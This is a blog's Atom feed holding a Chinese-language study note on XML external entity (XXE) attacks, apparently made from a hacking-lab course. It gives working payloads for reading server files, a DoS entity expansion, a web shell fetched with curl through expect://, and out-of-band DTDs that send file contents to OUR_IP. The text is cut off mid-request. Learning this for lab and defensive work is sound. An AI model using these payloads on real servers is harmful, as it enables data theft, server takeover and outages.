<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Salve</title>
  
  
  <link href="https://taninluv.github.io/atom.xml" rel="self"/>
  
  <link href="https://taninluv.github.io/"/>
  <updated>2023-09-12T13:27:28.461Z</updated>
  <id>https://taninluv.github.io/</id>
  
  <author>
    <name>TiAmo</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>web attacks-XXE</title>
    <link href="https://taninluv.github.io/2023/09/11/web-attacks-XXE/"/>
    <id>https://taninluv.github.io/2023/09/11/web-attacks-XXE/</id>
    <published>2023-09-11T07:00:57.000Z</published>
    <updated>2023-09-12T13:27:28.461Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Intro-to-XXE"><a href="#Intro-to-XXE" class="headerlink" title="Intro to XXE"></a>Intro to XXE</h1><p>XML外部实体（XXE）注入漏洞发生在从用户控制的输入中获取XML数据时，而没有对其进行适当的清理或安全解析，这可能使我们能够使用XML功能执行恶意操作。XXE漏洞会对web应用程序及其后端服务器造成相当大的损害，从泄露敏感文件到关闭后端服务器，这就是为什么它被OWASP认为是十大web安全风险之一。</p><span id="more"></span><p>XML文档的一些关键元素，如：</p><table><thead><tr><th>Key</th><th>Definition</th><th>Example</th></tr></thead><tbody><tr><td><code>Tag</code></td><td>The keys of an XML document, usually wrapped with (<code>&lt;</code>&#x2F;<code>&gt;</code>) characters.</td><td><code>&lt;date&gt;</code></td></tr><tr><td><code>Entity</code></td><td>XML variables, usually wrapped with (<code>&amp;</code>&#x2F;<code>;</code>) characters.</td><td><code>&lt;</code></td></tr><tr><td><code>Element</code></td><td>The root element or any of its child elements, and its value is stored in between a start-tag and an end-tag.</td><td><code>&lt;date&gt;01-01-2022&lt;/date&gt;</code></td></tr><tr><td><code>Attribute</code></td><td>Optional specifications for any element that are stored in the tags, which may be used by the XML parser.</td><td><code>version=&quot;1.0&quot;</code>&#x2F;<code>encoding=&quot;UTF-8&quot;</code></td></tr><tr><td><code>Declaration</code></td><td>Usually the first line of an XML document, and defines the XML version and encoding to use when parsing it.</td><td><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code></td></tr></tbody></table><p>此外，一些字符被用作XML文档结构的一部分，如&lt;、&gt;、&amp;或“。因此，如果我们需要在XML文档中使用它们，我们应该将它们替换为相应的实体引用（例如&amp;lt；、&amp;gt；、&amp;amp；、&amp;quot；）。最后，我们可以在&lt;！–和–&gt;之间的XML文档中编写注释，类似于HTML文档。</p><h1 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h1><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><table><thead><tr><th><strong>Code</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td><code>&lt;!ENTITY xxe SYSTEM &quot;http://localhost/email.dtd&quot;&gt;</code></td><td>Define External Entity to a URL</td></tr><tr><td><code>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</code></td><td>Define External Entity to a file path</td></tr><tr><td><code>&lt;!ENTITY company SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;</code></td><td>Read PHP source code with base64 encode filter</td></tr><tr><td><code>&lt;!ENTITY % error &quot;&lt;!ENTITY content SYSTEM &#39;%nonExistingEntity;/%file;&#39;&gt;&quot;&gt;</code></td><td>Reading a file through a PHP error</td></tr><tr><td><code>&lt;!ENTITY % oob &quot;&lt;!ENTITY content SYSTEM &#39;http://OUR_IP:8000/?content=%file;&#39;&gt;&quot;&gt;</code></td><td>Reading a file OOB exfiltration</td></tr></tbody></table><h2 id="XML-DTD"><a href="#XML-DTD" class="headerlink" title="XML DTD"></a>XML DTD</h2><p>XML文档类型定义（DTD）允许根据预定义的文档结构验证XML文档。预定义的文档结构可以在文档本身或外部文件中定义。下面是我们前面看到的XML文档的DTD示例：</p><pre><code class="xml">&lt;!DOCTYPE email [  &lt;!ELEMENT email (date, time, sender, recipients, body)&gt;  &lt;!ELEMENT recipients (to, cc?)&gt;  &lt;!ELEMENT cc (to*)&gt;  &lt;!ELEMENT date (#PCDATA)&gt;  &lt;!ELEMENT time (#PCDATA)&gt;  &lt;!ELEMENT sender (#PCDATA)&gt;  &lt;!ELEMENT to  (#PCDATA)&gt;  &lt;!ELEMENT body (#PCDATA)&gt;]&gt;</code></pre><p>正如我们所看到的，DTD使用element类型声明来声明根电子邮件元素，然后表示其子元素。之后，每个子元素也被声明，其中一些子元素也具有子元素，而其他子元素可能仅包含原始数据（如PCDATA所示）。 上面的DTD可以放在XML文档本身中，就在第一行的XML声明之后。否则，它可以存储在一个外部文件（例如email.dtd）中，然后在XML文档中使用SYSTEM关键字引用，如下所示：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE email SYSTEM &quot;email.dtd&quot;&gt;</code></pre><p>也可以通过URL引用DTD，如下所示：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE email SYSTEM &quot;http://inlanefreight.com/email.dtd&quot;&gt;</code></pre><p>这与HTML文档定义和引用JavaScript和CSS脚本的方式相对类似。</p><h2 id="XML-Entities"><a href="#XML-Entities" class="headerlink" title="XML Entities"></a>XML Entities</h2><p>我们还可以在XML DTD中定义自定义实体（即XML变量），以允许重构变量并减少重复数据。这可以通过使用ENTITY关键字来完成，该关键字后面跟着实体名称及其值，如下所示：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE email [  &lt;!ENTITY company &quot;Inlane Freight&quot;&gt;]&gt;</code></pre><p>一旦我们定义了一个实体，它就可以在XML文档中用&amp;和分号引用；（例如&amp;company；）。每当引用实体时，XML解析器都会将其替换为其值。然而，最有趣的是，我们可以使用SYSTEM关键字引用外部XML实体，该关键字后面跟着外部实体的路径，如下所示：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE email [  &lt;!ENTITY company SYSTEM &quot;http://localhost/company.txt&quot;&gt;  &lt;!ENTITY signature SYSTEM &quot;file:///var/www/html/signature.txt&quot;&gt;]&gt;</code></pre><p>注意：我们也可以使用PUBLIC关键字而不是SYSTEM来加载外部资源，后者用于公开声明的实体和标准，例如语言代码（lang&#x3D;“en”）。</p><p>这与文档中定义的内部XML实体类似。当我们引用外部实体（例如&amp;signature；）时，解析器会用存储在外部文件中的值（例如signature.txt）替换该实体。当在服务器端解析XML文件时，在SOAP（XML）API或web表单等情况下，实体可以引用存储在后端服务器上的文件，当我们引用该实体时，最终可能会向我们披露该文件。</p><h1 id="Local-File-Disclosure"><a href="#Local-File-Disclosure" class="headerlink" title="Local File Disclosure"></a>Local File Disclosure</h1><p>当web应用程序信任来自用户输入的未过滤的XML数据时，我们可能能够引用外部XMLDTD文档并定义新的自定义XML实体。假设我们可以定义新的实体并将它们显示在网页上。在这种情况下，我们还应该能够定义外部实体，并使它们引用本地文件，当显示本地文件时，该文件应该在后端服务器上向我们显示该文件的内容。 让我们看看如何识别潜在的XXE漏洞，并利用它们从后端服务器读取敏感文件。</p><h2 id="Identifying"><a href="#Identifying" class="headerlink" title="Identifying"></a>Identifying</h2><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121003069.jpeg" alt="xxe_request" style="zoom:150%;" /><p>正如我们所看到的，该表单似乎正在以XML格式将我们的数据发送到web服务器，使其成为潜在的XXE测试目标。假设web应用程序使用过时的XML库，并且它没有对XML输入应用任何过滤器或净化。在这种情况下，我们可能能够利用这种XML表单来读取本地文件。 </p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121004984.jpeg" alt="xxe_response"></p><p>我们看到电子邮件元素的值正在页面上显示给我们。要将外部文件的内容打印到页面上，我们应该注意显示了哪些元素，这样我们就知道要注入哪些元素。在某些情况下，可能不会显示任何元素，我们将在接下来的部分中介绍如何利用这些元素。 目前，我们知道，无论我们在<email></email>元素中放置什么值，都会显示在HTTP响应中。因此，让我们尝试定义一个新的实体，然后将其用作电子邮件元素中的变量，看看它是否被我们定义的值所取代。为此，我们可以使用上一节中学到的内容来定义新的XML实体，并在XML输入的第一行之后添加以下行：</p><pre><code class="xml">&lt;!DOCTYPE email [  &lt;!ENTITY company &quot;Inlane Freight&quot;&gt;]&gt;</code></pre><blockquote><p>注意：在我们的示例中，HTTP请求中的XML输入没有在XML数据本身中声明DTD，也没有在外部引用DTD，所以我们在定义实体之前添加了一个新的DTD。如果DOCTYPE已经在XML请求中声明，我们只需要向其中添加ENTITY元素。</p></blockquote><p>现在，我们应该有一个名为company的新XML实体，我们可以使用&amp;company；来引用它；。因此，与其在电子邮件元素中使用我们的电子邮件，不如让我们尝试使用&amp;company；，看看它是否会被我们定义的值（Inlane Freight）所取代：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121008563.jpeg" alt="new_entity"></p><p>正如我们所看到的，响应确实使用了我们定义的实体（Inlane Freight）的值，而不是显示&amp;company；，表明我们可以注入XML代码。相比之下，非易受攻击的web应用程序会将（&amp;company；）显示为原始值。这证实了我们正在处理一个易受XXE攻击的web应用程序。</p><blockquote><p>注意：有些web应用程序在HTTP请求中可能默认为JSON格式，但仍可能接受其他格式，包括XML。因此，即使web应用程序以JSON格式发送请求，我们也可以尝试将Content-Type标头更改为application&#x2F;xml，然后使用在线工具将JSON数据转换为xml。如果web应用程序确实接受了带有XML数据的请求，那么我们也可以针对XXE漏洞对其进行测试，这可能会揭示一个意想不到的XXE漏洞。</p></blockquote><h2 id="Reading-Sensitive-Files"><a href="#Reading-Sensitive-Files" class="headerlink" title="Reading Sensitive Files"></a>Reading Sensitive Files</h2><p>现在我们可以定义新的内部XML实体了，让我们看看是否可以定义外部XML实体。这样做与我们之前所做的非常相似，但我们只需添加SYSTEM关键字并在其后面定义外部引用路径，正如我们在上一节中所学到的：</p><pre><code class="xml">&lt;!DOCTYPE email [  &lt;!ENTITY company SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</code></pre><blockquote><p>提示：在某些Java web应用程序中，我们还可以指定一个目录而不是文件，并且我们将获得一个目录列表，这对于定位敏感文件非常有用。</p></blockquote><h2 id="Reading-Source-Code"><a href="#Reading-Source-Code" class="headerlink" title="Reading Source Code"></a>Reading Source Code</h2><p>本地文件公开的另一个好处是能够获得web应用程序的源代码。这将使我们能够执行白盒渗透测试，以揭示web应用程序中的更多漏洞，或者至少揭示数据库密码或API密钥等秘密配置。 因此，让我们看看是否可以使用相同的攻击来读取index.php文件的源代码，如下所示：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121012371.jpeg" alt="file_php"></p><p>正如我们所看到的，这并没有奏效，因为我们没有得到任何内容。之所以发生这种情况，是因为我们引用的文件不是正确的XML格式，因此无法将其作为外部XML实体进行引用。&#x3D;&#x3D;如果一个文件包含一些XML的特殊字符（例如&lt;&#x2F;&gt;&#x2F;&amp;），它将破坏外部实体引用，并且不用于引用。&#x3D;&#x3D;此外，我们不能读取任何二进制数据，因为它也不符合XML格式。 幸运的是，PHP提供了包装过滤器，允许我们对某些资源（包括文件）进行base64编码，在这种情况下，最终的base64输出不应破坏XML格式。为此，我们将使用PHP的php:&#x2F;&#x2F;filter&#x2F;包装。有了这个过滤器，我们可以指定convert.base64-encode编码器作为我们的过滤器，然后添加一个输入资源（例如resource&#x3D;index.php），如下所示：</p><h2 id="Remote-Code-Execution-with-XXE"><a href="#Remote-Code-Execution-with-XXE" class="headerlink" title="Remote Code Execution with XXE"></a>Remote Code Execution with XXE</h2><p>除了读取本地文件外，我们还可以通过远程服务器执行代码。最简单的方法是通过调用我们的服务器来寻找ssh密钥，或者尝试在基于Windows的web应用程序中使用哈希窃取技巧。如果这些都不起作用，我们仍然&#x3D;&#x3D;可以通过PHP:&#x2F;&#x2F;expect过滤器在基于PHP的web应用程序上执行命令&#x3D;&#x3D;，尽管这需要安装并启用PHP expect模块。 如果XXE直接打印其输出“如本节所示”，那么我们可以执行如下基本命令expect:&#x2F;&#x2F;id，并且页面应该打印命令输出。但是，如果我们无法访问输出，或者需要执行更复杂的命令“例如reverse shell”，则XML语法可能会中断，该命令可能无法执行。 将XXE转换为RCE的最有效方法是从服务器中获取一个web外壳并将其写入web应用程序，然后我们可以与它交互以执行命令。为此，我们可以先编写一个基本的PHP web shell，然后启动一个python web服务器，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo &#39;&lt;?php system($_REQUEST[&quot;cmd&quot;]);?&gt;&#39; &gt; shell.phpTanin@htb[/htb]$ sudo python3 -m http.server 80</code></pre><p>现在，我们可以使用以下XML代码来执行一个curl命令，该命令将我们的web shell下载到远程服务器：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE email [  &lt;!ENTITY company SYSTEM &quot;expect://curl$IFS-O$IFS&#39;OUR_IP/shell.php&#39;&quot;&gt;]&gt;&lt;root&gt;&lt;name&gt;&lt;/name&gt;&lt;tel&gt;&lt;/tel&gt;&lt;email&gt;&amp;company;&lt;/email&gt;&lt;message&gt;&lt;/message&gt;&lt;/root&gt;</code></pre><blockquote><p>注意：我们用$IFS替换了上面XML代码中的所有空格，以避免破坏XML语法。此外，许多其他字符（如|、&gt;和{）可能会破坏代码，因此我们应该避免使用它们。</p></blockquote><p>注意：expect模块在现代PHP服务器上默认不会启用&#x2F;安装，因此这种攻击可能并不总是有效的。这就是为什么XXE通常用于披露敏感的本地文件和源代码，这可能会揭示额外的漏洞或获得代码执行的方式。</p><h2 id="Other-XXE-Attacks"><a href="#Other-XXE-Attacks" class="headerlink" title="Other XXE Attacks"></a>Other XXE Attacks</h2><p>另一种经常通过XXE漏洞进行的常见攻击是SSRF利用，该漏洞用于枚举本地打开的端口，并通过XXE弱点访问其页面和其他受限网页。服务器端攻击模块完全涵盖了SSRF，XXE攻击也可以采用相同的技术。 最后，XXE攻击的一个常见用途是对托管web服务器造成拒绝服务（DOS），使用以下有效载荷：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE email [  &lt;!ENTITY a0 &quot;DOS&quot; &gt;  &lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;  &lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;  &lt;!ENTITY a3 &quot;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&quot;&gt;  &lt;!ENTITY a4 &quot;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&quot;&gt;  &lt;!ENTITY a5 &quot;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&quot;&gt;  &lt;!ENTITY a6 &quot;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&quot;&gt;  &lt;!ENTITY a7 &quot;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&quot;&gt;  &lt;!ENTITY a8 &quot;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&quot;&gt;  &lt;!ENTITY a9 &quot;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&quot;&gt;          &lt;!ENTITY a10 &quot;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&quot;&gt;        ]&gt;&lt;root&gt;&lt;name&gt;&lt;/name&gt;&lt;tel&gt;&lt;/tel&gt;&lt;email&gt;&amp;a10;&lt;/email&gt;&lt;message&gt;&lt;/message&gt;&lt;/root&gt;</code></pre><p>这个有效负载将a0实体定义为DOS，在a1中多次引用它，在a2中引用a1，以此类推，直到后端服务器的内存由于自引用循环而耗尽。然而，这种攻击不再适用于现代web服务器（例如Apache），因为它们可以防止实体自引用。</p><h1 id="Advanced-File-Disclosure"><a href="#Advanced-File-Disclosure" class="headerlink" title="Advanced File Disclosure"></a>Advanced File Disclosure</h1><p>并非所有XXE漏洞都可以直接利用，正如我们在上一节中所看到的那样。有些文件格式可能无法通过基本的XXE读取，而在其他情况下，web应用程序在某些情况下可能不会输出任何输入值，因此我们可能会试图通过错误来使用它。</p><h2 id="Advanced-Exfiltration-with-CDATA"><a href="#Advanced-Exfiltration-with-CDATA" class="headerlink" title="Advanced Exfiltration with CDATA"></a>Advanced Exfiltration with CDATA</h2><p>在上一节中，我们看到了如何使用PHP过滤器对PHP源文件进行编码，以便它们在被引用时不会破坏XML格式，这（正如我们所看到的）阻止了我们读取这些文件。但是其他类型的Web应用程序呢？我们可以使用另一种方法为任何web应用程序后端提取任何类型的数据（包括二进制数据）。要输出不符合XML格式的数据，我们可以使用CDATA标记（例如&lt;！[CDATA[file_content]]）包装外部文件引用的内容。通过这种方式，XML解析器将考虑这部分原始数据，这些数据可能包含任何类型的数据，包括任何特殊字符。 解决这个问题的一个简单方法是用&lt;！[CDATA[，一个带有]]&gt;的结束内部实体，然后将我们的外部实体文件放在两者之间，它应该被视为CDATA元素，如下所示：</p><pre><code class="xml">&lt;!DOCTYPE email [  &lt;!ENTITY begin &quot;&lt;![CDATA[&quot;&gt;  &lt;!ENTITY file SYSTEM &quot;file:///var/www/html/submitDetails.php&quot;&gt;  &lt;!ENTITY end &quot;]]&gt;&quot;&gt;  &lt;!ENTITY joined &quot;&amp;begin;&amp;file;&amp;end;&quot;&gt;]&gt;</code></pre><p>之后，如果我们引用&amp;joind；实体，它应该包含我们的转义数据。然而，这是行不通的，因为XML阻止连接内部和外部实体，所以我们必须找到更好的方法。 为了绕过这一限制，我们可以使用XML参数实体，这是一种特殊类型的实体，以%字符开头，只能在DTD中使用。参数实体的独特之处在于，如果我们从外部源（例如，我们自己的服务器）引用它们，那么所有这些实体都将被视为外部实体，并且可以连接，如下所示：</p><pre><code class="xml">&lt;!ENTITY joined &quot;%begin;%file;%end;&quot;&gt;</code></pre><p>因此，让我们尝试读取submitDetails.php文件，方法是首先将上述行存储在DTD文件（例如xxe.DTD）中，将其托管在我们的机器上，然后将其作为目标web应用程序上的外部实体引用，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo &#39;&lt;!ENTITY joined &quot;%begin;%file;%end;&quot;&gt;&#39; &gt; xxe.dtdTanin@htb[/htb]$ python3 -m http.server 8000Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</code></pre><p>现在，我们可以引用我们的外部实体（xxe.dtd），然后打印&amp;joind；我们在上面定义的实体，它应该包含submitDetails.php文件的内容，如下所示：</p><pre><code class="xml">&lt;!DOCTYPE email [  &lt;!ENTITY % begin &quot;&lt;![CDATA[&quot;&gt; &lt;!-- prepend the beginning of the CDATA tag --&gt;  &lt;!ENTITY % file SYSTEM &quot;file:///var/www/html/submitDetails.php&quot;&gt; &lt;!-- reference external file --&gt;  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt; &lt;!-- append the end of the CDATA tag --&gt;  &lt;!ENTITY % xxe SYSTEM &quot;http://OUR_IP:8000/xxe.dtd&quot;&gt; &lt;!-- reference our external DTD --&gt;  %xxe;]&gt;...&lt;email&gt;&amp;joined;&lt;/email&gt; &lt;!-- reference the &amp;joined; entity to print the file content --&gt;</code></pre><p>一旦我们编写了xxe.dtd文件，并将其托管在我们的机器上，然后将上面的行添加到我们对易受攻击的web应用程序的HTTP请求中，我们就可以最终获得submitDetails.php文件的内容：</p><blockquote><p>注意：在一些现代web服务器中，我们可能无法读取某些文件（如index.php），因为web服务器将防止由文件&#x2F;实体自引用（即XML实体引用循环）引起的DOS攻击，如前一节所述。</p></blockquote><p>当基本的XXE方法不起作用或处理其他web开发框架时，这个技巧会变得非常方便。尝试使用此技巧读取其他文件。</p><h2 id="Error-Based-XXE"><a href="#Error-Based-XXE" class="headerlink" title="Error Based XXE"></a>Error Based XXE</h2><p>我们可能会遇到的另一种情况是，web应用程序可能不会编写任何输出，因此我们无法控制任何XML输入实体来编写其内容。在这种情况下，我们将对XML输出视而不见，因此无法使用我们通常的方法检索文件内容。 如果web应用程序显示运行时错误（例如，PHP错误），并且没有对XML输入进行适当的异常处理，那么我们可以使用此缺陷读取XXE漏洞的输出。如果web应用程序既不编写XML输出也不显示任何错误，那么我们将面临完全盲目的情况，我们将在下一节中对此进行讨论。 让我们考虑一下本节末尾&#x2F;error中的练习，其中没有任何XML输入实体显示在屏幕上。因此，我们没有可以控制的实体来编写文件输出。首先，让我们尝试发送格式错误的XML数据，并查看web应用程序是否显示任何错误。为此，我们可以删除任何关闭标记，更改其中一个，使其不关闭（例如，<roo>而不是<root>），或者仅引用不存在的实体，如下所示：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309121101005.jpeg" alt="cause_error"></p><p>我们看到，我们确实导致web应用程序显示错误，而且它还显示了web服务器目录，我们可以使用该目录读取其他文件的源代码。现在，我们可以利用这个漏洞来泄露文件内容。要做到这一点，我们将使用与之前使用的技术类似的技术。首先，我们将托管一个DTD文件，该文件包含以下有效负载：</p><pre><code class="xml">&lt;!ENTITY % file SYSTEM &quot;file:///etc/hosts&quot;&gt;&lt;!ENTITY % error &quot;&lt;!ENTITY content SYSTEM &#39;%nonExistingEntity;/%file;&#39;&gt;&quot;&gt;</code></pre><p>上面的负载定义了文件参数实体，然后将其与一个不存在的实体连接。在我们之前的练习中，我们连接了三根弦。在这种情况下，%nonExistingEntity；不存在，所以web应用程序会抛出一个错误，说这个实体不存在，以及我们加入的%file；作为错误的一部分。还有许多其他变量可能会导致错误，比如错误的URI或引用文件中有错误的字符。 现在，我们可以调用外部DTD脚本，然后引用错误实体，如下所示：</p><pre><code class="xml">&lt;!DOCTYPE email [   &lt;!ENTITY % remote SYSTEM &quot;http://OUR_IP:8000/xxe.dtd&quot;&gt;  %remote;  %error;]&gt;</code></pre><p>一旦我们像前面那样托管DTD脚本，并将上述有效负载作为XML数据发送（不需要包括任何其他XML数据），我们将获得&#x2F;etc&#x2F;hosts文件的内容</p><p>这种方法也可以用于读取文件的源代码。我们所要做的就是更改DTD脚本中的文件名，以指向我们想要读取的文件（例如“file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;submitDetails.php“）。然而，这种方法不如以前读取源文件的方法可靠，因为它可能有长度限制，而且某些特殊字符仍然可能会破坏它。</p><h1 id="Blind-Data-Exfiltration"><a href="#Blind-Data-Exfiltration" class="headerlink" title="Blind Data Exfiltration"></a>Blind Data Exfiltration</h1><p>在上一节中，我们看到了一个盲XXE漏洞的示例，在该漏洞中，我们没有收到任何包含任何XML输入实体的输出。由于web服务器显示PHP运行时错误，我们可以使用此缺陷从显示的错误中读取文件的内容。在本节中，我们将了解如何在完全盲目的情况下获取文件的内容，在这种情况下，我们既不会获得任何XML实体的输出，也不会显示任何PHP错误。</p><h2 id="Out-of-band-Data-Exfiltration"><a href="#Out-of-band-Data-Exfiltration" class="headerlink" title="Out-of-band Data Exfiltration"></a>Out-of-band Data Exfiltration</h2><p>如果我们试图通过在&#x2F;wind上找到的练习重复任何方法，我们会很快注意到它们似乎都不起作用，因为我们无法在web应用程序响应上打印任何内容。对于这种情况，我们可以使用一种称为带外（OOB）数据过滤的方法，该方法通常用于具有许多网络攻击的类似盲情况，如盲SQL注入、盲命令注入、盲XSS，当然还有盲XXE。跨站点脚本（XSS）和Whitebox Pentesting 101:Command Injections模块都讨论了类似的攻击，这里我们将利用类似的攻击进行轻微修改，以适应我们的XXE漏洞。 在我们之前的攻击中，我们使用了带外攻击，因为我们在机器中托管了DTD文件，并使web应用程序连接到我们（因此是带外）。所以，我们这次的进攻将非常相似，只有一个显著的区别。我们将使web应用程序向我们的web服务器发送一个web请求，其中包含我们正在读取的文件的内容，而不是让web应用程序将我们的文件实体输出到特定的XML实体。 为此，我们可以首先为正在读取的文件的内容使用一个参数实体，同时使用PHP过滤器对其进行base64编码。然后，我们将创建另一个外部参数实体并将其引用到我们的IP，并将文件参数值作为通过HTTP请求的URL的一部分，如下所示：</p><pre><code class="xml">&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;&lt;!ENTITY % oob &quot;&lt;!ENTITY content SYSTEM &#39;http://OUR_IP:8000/?content=%file;&#39;&gt;&quot;&gt;</code></pre><p>例如，如果我们要读取的文件的内容为XXE_SAMPLE_DATA，那么文件参数将保存其base64编码的数据（WFhFX1NBTVBMRV9EQVRB）。当XML试图从我们的机器引用外部oob参数时，它将请求<a href="http://our_ip:8000/?content=WFhFX1NBTVBMRV9EQVRB.%E6%9C%80%E5%90%8E%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%AF%B9WFhFX1NBTVBMRV9EQVRB%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%9B%E8%A1%8C%E8%A7%A3%E7%A0%81%EF%BC%8C%E4%BB%A5%E8%8E%B7%E5%BE%97%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9%E3%80%82%E6%88%91%E4%BB%AC%E7%94%9A%E8%87%B3%E5%8F%AF%E4%BB%A5%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PHP%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%87%AA%E5%8A%A8%E6%A3%80%E6%B5%8B%E7%BC%96%E7%A0%81%E7%9A%84%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%EF%BC%8C%E5%AF%B9%E5%85%B6%E8%BF%9B%E8%A1%8C%E8%A7%A3%E7%A0%81%EF%BC%8C%E5%B9%B6%E5%B0%86%E5%85%B6%E8%BE%93%E5%87%BA%E5%88%B0%E7%BB%88%E7%AB%AF%EF%BC%9A">http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB.最后，我们可以对WFhFX1NBTVBMRV9EQVRB字符串进行解码，以获得文件的内容。我们甚至可以编写一个简单的PHP脚本，自动检测编码的文件内容，对其进行解码，并将其输出到终端：</a></p><pre><code class="php">&lt;?phpif(isset($_GET[&#39;content&#39;]))&#123;    error_log(&quot;\n\n&quot; . base64_decode($_GET[&#39;content&#39;]));&#125;?&gt;</code></pre><p>因此，我们将首先将上面的PHP代码写入index.PHP，然后在8000端口上启动一个PHP服务器，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ vi index.php # here we write the above PHP codeTanin@htb[/htb]$ php -S 0.0.0.0:8000PHP 7.4.3 Development Server (http://0.0.0.0:8000) started</code></pre><p>现在，为了启动我们的攻击，我们可以使用与基于错误的攻击中使用的负载类似的负载，只需添加<root>&amp;content</root>，它需要引用我们的实体，并让它向我们的机器发送带有文件内容的请求：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE email [   &lt;!ENTITY % remote SYSTEM &quot;http://OUR_IP:8000/xxe.dtd&quot;&gt;  %remote;  %oob;]&gt;&lt;root&gt;&amp;content;&lt;/root&gt;</code></pre><p>然后，我们可以将请求发送到web应用程序：</p><p>最后，我们可以回到我们的终端，我们将看到我们确实得到了请求及其解码内容：</p><pre><code class="shell-session">PHP 7.4.3 Development Server (http://0.0.0.0:8000) started10.10.14.16:46256 Accepted10.10.14.16:46256 [200]: (null) /xxe.dtd10.10.14.16:46256 Closing10.10.14.16:46258 Acceptedroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologin...SNIP...</code></pre><p>提示：除了将base64编码的数据存储为URL的参数外，我们还可以使用DNS OOB Exfiltering，将编码的数据作为URL的子域（例如ENCODEDTEXT.our.website.com），然后使用tcpdump等工具捕获任何传入流量并解码子域字符串以获取数据。诚然，这种方法更先进，需要付出更多的努力来过滤数据。</p><h2 id="Automated-OOB-Exfiltration"><a href="#Automated-OOB-Exfiltration" class="headerlink" title="Automated OOB Exfiltration"></a>Automated OOB Exfiltration</h2><p>尽管在某些情况下，我们可能不得不使用上面学到的手动方法，但在许多其他情况下，可以使用工具自动化盲XXE数据的过滤过程。 <a href="https://github.com/enjoiz/XXEinjector">XXEinjector</a>就是这样一个工具。该工具支持我们在本模块中学到的大多数技巧，包括基本XXE、CDATA源exfiltering、基于错误的XXE和盲目OOB XXE。 要使用此工具进行OOB自动过滤，我们可以首先将该工具克隆到我们的机器上，如下所示：</p><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/enjoiz/XXEinjector.gitCloning into &#39;XXEinjector&#39;......SNIP...</code></pre><p>一旦我们有了这个工具，我们就可以从Burp复制HTTP请求，并将其写入一个文件供工具使用。我们不应该包括完整的XML数据，只包括第一行，并在它后面写XXEINJECT作为工具的位置定位器：</p><pre><code class="http">POST /blind/submitDetails.php HTTP/1.1Host: 10.129.201.94Content-Length: 169User-Agent: 